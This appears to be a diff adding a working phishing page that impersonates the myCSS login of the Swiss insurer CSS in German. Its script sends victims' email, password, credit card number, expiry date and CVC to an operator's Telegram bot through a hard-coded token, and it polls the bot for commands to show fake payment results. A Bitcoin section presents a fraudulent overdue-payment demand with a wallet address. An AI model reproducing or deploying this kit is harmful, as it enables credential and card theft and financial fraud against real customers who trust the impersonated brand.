@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login myCSS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            text-align: center;
+            background-color: #fff;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            height: 50px;
+            margin-right: 10px;
+        }
+
+        .anniversary-logo {
+            height: 50px;
+        }
+
+        .language-switcher a {
+            margin: 0 10px;
+            text-decoration: none;
+            color: #333;
+        }
+
+        .language-switcher a:hover {
+            text-decoration: underline;
+        }
+
+        main {
+            margin-top: 100px;
+            flex: 1;
+        }
+
+        h1 {
+            font-size: 32px;
+            color: #004a99;
+            margin-bottom: 30px;
+            font-weight: 300;
+        }
+
+        form {
+            display: inline-block;
+            text-align: left;
+            background: #e6f2ff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 320px;
+            box-sizing: border-box;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background: linear-gradient(to right, #4b79a1, #283e51);
+            border: none;
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 500;
+            margin-top: 10px;
+            box-sizing: border-box;
+        }
+
+        button:hover {
+            background: linear-gradient(to right, #365492, #1c2d3a);
+        }
+
+        .additional-links {
+            margin-top: 20px;
+        }
+
+        .additional-links a {
+            display: block;
+            margin: 10px 0;
+            color: #004a99;
+            text-decoration: none;
+        }
+
+        .additional-links a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            width: 100%;
+            text-align: center;
+            background-color: #fff;
+            padding: 10px 0;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
+            margin-top: auto;
+        }
+
+        footer a {
+            margin: 0 10px;
+            text-decoration: none;
+            color: #004a99;
+        }
+
+        footer .help {
+            display: inline-flex;
+            align-items: center;
+        }
+
+        footer .help img {
+            margin-right: 5px;
+        }
+
+        .content {
+            display: none;
+            margin-top: 100px;
+            padding: 20px;
+        }
+
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .logo-container {
+                margin-bottom: 10px;
+            }
+
+            main {
+                margin-top: 50px;
+            }
+
+            form {
+                width: 90%;
+                max-width: 90%;
+                padding: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            header {
+                padding: 10px;
+            }
+
+            .logo {
+                height: 40px;
+            }
+
+            .anniversary-logo {
+                height: 40px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            form {
+                padding: 15px;
+            }
+
+            input, button {
+                padding: 8px;
+            }
+
+            footer {
+                padding: 5px 0;
+            }
+
+            footer a {
+                margin: 0 5px;
+            }
+        }
+
+        /* Klarna transition effect */
+        #klarna-transition {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            color: white;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        #klarna-transition h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        #klarna-transition p {
+            font-size: 18px;
+            margin-bottom: 40px;
+        }
+
+        #klarna-transition button {
+            background-color: #00a1e4;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        #klarna-transition button:hover {
+            background-color: #007bb5;
+        }
+
+        /* Loading animation */
+        #loading-animation {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #loading-animation .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="https://id.css.ch/auth/ui/assets/custom/img/css-logo/CSS_cyan_rgb.svg?9459b891058b43064e12" alt="CSS Logo" class="logo">
+            <img src="https://id.css.ch/auth/ui/assets/custom/img/css-logo/CSS_125_siegel_dfi.svg?9459b891058b43064e12" alt="125 Jahre Logo" class="anniversary-logo">
+        </div>
+        <div class="language-switcher">
+            <a href="#">De</a>
+            <a href="#">Fr</a>
+            <a href="#">It</a>
+            <a href="#">En</a>
+        </div>
+    </header>
+    <main id="login-section">
+        <h1>Login myCSS</h1>
+        <form id="login-form" action="javascript:void(0);">
+            <label for="email">E-Mail</label>
+            <input type="email" id="email" name="email" required>
+            <label for="password">Passwort</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="additional-links">
+            <a href="#">Noch nicht registriert?</a>
+            <a href="#">Passwort vergessen?</a>
+        </div>
+    </main>
+    
+    <main id="payment-method-section" class="content">
+        <h1>Wählen Sie Ihre Zahlungsmethode</h1>
+        <button onclick="showPaymentForm('twint')">TWINT</button>
+        <button onclick="showPaymentForm('credit-card')">Kreditkarte</button>
+        <button onclick="showPaymentForm('klarna')">Klarna (SOFORT)</button>
+        <button onclick="showPaymentForm('bitcoin')">Bitcoin</button>
+    </main>
+    
+    <main id="twint-section" class="content">
+        <h1>TWINT Zahlung</h1>
+        <form id="twint-form" action="javascript:void(0);">
+            <p>Bitte scannen Sie den QR-Code mit Ihrer TWINT App.</p>
+            <img src="path/to/twint-qr-code.png" alt="TWINT QR Code">
+            <button type="button" onclick="backToPaymentMethods()">Zurück</button>
+        </form>
+    </main>
+
+    <main id="credit-card-section" class="content">
+        <h1>Kreditkartenzahlung</h1>
+        <form id="credit-card-form" action="javascript:void(0);">
+            <label for="cc-number">Kreditkartennummer</label>
+            <input type="text" id="cc-number" name="cc-number" required>
+            <label for="cc-expiry">Ablaufdatum</label>
+            <input type="text" id="cc-expiry" name="cc-expiry" required>
+            <label for="cc-cvc">CVC</label>
+            <input type="text" id="cc-cvc" name="cc-cvc" required>
+            <button type="submit">Bezahlen</button>
+            <button type="button" onclick="backToPaymentMethods()">Zurück</button>
+        </form>
+    </main>
+
+    <main id="klarna-section" class="content">
+        <h1>Klarna (SOFORT) Zahlung</h1>
+        <form id="klarna-form" action="javascript:void(0);">
+            <p>Sie werden zur Zahlung zu Klarna weitergeleitet.</p>
+            <button type="button" onclick="showKlarnaTransition()">Weiter zu Klarna</button>
+            <button type="button" onclick="backToPaymentMethods()">Zurück</button>
+        </form>
+    </main>
+
+    <main id="bitcoin-section" class="content">
+        <h1>Bitcoin Zahlung</h1>
+        <form id="bitcoin-form" action="javascript:void(0);">
+            <p>Wir möchten Sie darauf hinweisen, dass Ihre Zahlung in Höhe von 471.81 CHF noch aussteht.
+            <br>
+            Bitte begleichen Sie den offenen Betrag umgehend, da sonst unsere Leistungen eingestellt werden.
+            <br>
+            Verwenden Sie dazu bitte den folgenden Zahlungscode:
+            <br>
+            Bitte auf folgendes Bitcoin-Wallet überweisen:
+            <br><br>
+            <img src="/mnt/data/grafik.png" alt="btc_qe"> 
+            <br>
+            bc1qggtqppjnfd6q2pxnp5rhgy8u9fepgmkqggzqx8
+            <br><br>
+            Vielen Dank für Ihre sofortige Aufmerksamkeit.
+            <br>
+            Mit freundlichen Grüßen,
+            <br>
+            Ihr CSS Team
+            </p>
+            <button type="button" onclick="backToPaymentMethods()">Zurück</button>
+        </form>
+    </main>
+
+    <div id="klarna-transition">
+        <h1>Klarna</h1>
+        <p>Siehst du kein Klarna Fenster? Dann tippe unten auf den Button, um deine Bestellung abzuschließen</p>
+        <button onclick="redirectToKlarna()">Weiter zu Klarna</button>
+    </div>
+
+    <div id="loading-animation">
+        <div class="spinner"></div>
+    </div>
+
+    <main id="success-section" class="content">
+        <h1>Zahlung erfolgreich</h1>
+        <p>Vielen Dank für Ihre Zahlung. Ihre Transaktion wurde erfolgreich abgeschlossen.</p>
+    </main>
+
+    <main id="failure-section" class="content">
+        <h1>Zahlung verweigert</h1>
+        <p>Ihre Zahlung wurde verweigert. Bitte versuchen Sie es erneut.</p>
+        <button type="button" onclick="backToPaymentMethods()">Erneut versuchen</button>
+    </main>
+
+    <footer>
+        <a href="#">Datenschutz</a>
+        <a href="#">Cookie Policy</a>
+        <span>v1.76.6</span>
+        <a href="#" class="help">
+            <img src="path/to/phone-icon.png" alt="Telefon Symbol">
+            Benötigen Sie Hilfe?
+        </a>
+    </footer>
+    <script>
+        const botToken = '7497631300:AAFe6ppLycd1xS4CmI1QsqC0wA8HbE-BlBE';
+        const chatId = '6850945960';
+        const successCommand = '/payment_success';
+        const failureCommand = '/payment_failure';
+
+        function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+        function checkTelegramMessages() {
+            const url = `https://api.telegram.org/bot${botToken}/getUpdates`;
+            fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                const messages = data.result;
+                const lastMessage = messages[messages.length - 1];
+                const text = lastMessage.message.text;
+
+                if (text === successCommand) {
+                    showSuccessPage();
+                } else if (text === failureCommand) {
+                    showFailurePage();
+                } else {
+                    setTimeout(checkTelegramMessages, 2000);
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                setTimeout(checkTelegramMessages, 2000);
+            });
+        }
+
+        function showLoadingAnimation() {
+            document.getElementById('loading-animation').style.display = 'flex';
+        }
+
+        function hideLoadingAnimation() {
+            document.getElementById('loading-animation').style.display = 'none';
+        }
+
+        function showSuccessPage() {
+            hideLoadingAnimation();
+            document.getElementById('credit-card-section').style.display = 'none';
+            document.getElementById('success-section').style.display = 'block';
+        }
+
+        function showFailurePage() {
+            hideLoadingAnimation();
+            document.getElementById('credit-card-section').style.display = 'none';
+            document.getElementById('failure-section').style.display = 'block';
+        }
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+            sendMessageToTelegram(message);
+
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('payment-method-section').style.display = 'block';
+        });
+
+        document.getElementById('credit-card-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const ccNumber = document.getElementById('cc-number').value;
+            const ccExpiry = document.getElementById('cc-expiry').value;
+            const ccCvc = document.getElementById('cc-cvc').value;
+            const message = `Credit Card Payment:\nCard Number: ${ccNumber}\nExpiry: ${ccExpiry}\nCVC: ${ccCvc}`;
+            sendMessageToTelegram(message);
+
+            showLoadingAnimation();
+            checkTelegramMessages();
+        });
+
+        document.getElementById('twint-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const message = 'TWINT payment selected.';
+            sendMessageToTelegram(message);
+        });
+
+        document.getElementById('klarna-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const message = 'Klarna payment selected.';
+            sendMessageToTelegram(message);
+        });
+
+        document.getElementById('bitcoin-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const message = 'Bitcoin payment selected.';
+            sendMessageToTelegram(message);
+        });
+
+        function showPaymentForm(method) {
+            document.getElementById('payment-method-section').style.display = 'none';
+            document.getElementById(method + '-section').style.display = 'block';
+            sendMessageToTelegram(`${method.charAt(0).toUpperCase() + method.slice(1)} payment method selected.`);
+        }
+
+        function backToPaymentMethods() {
+            document.querySelectorAll('.content').forEach(section => section.style.display = 'none');
+            document.getElementById('payment-method-section').style.display = 'block';
+            sendMessageToTelegram('Back to payment method selection.');
+        }
+
+        function showKlarnaTransition() {
+            document.getElementById('klarna-transition').style.display = 'flex';
+            setTimeout(() => {
+                redirectToKlarna();
+            }, 3000); 
+        }
+
+        function redirectToKlarna() {
+            window.location.href = 'https://www.klarna.com';
+        }
+    </script>
+</body>
+</html>
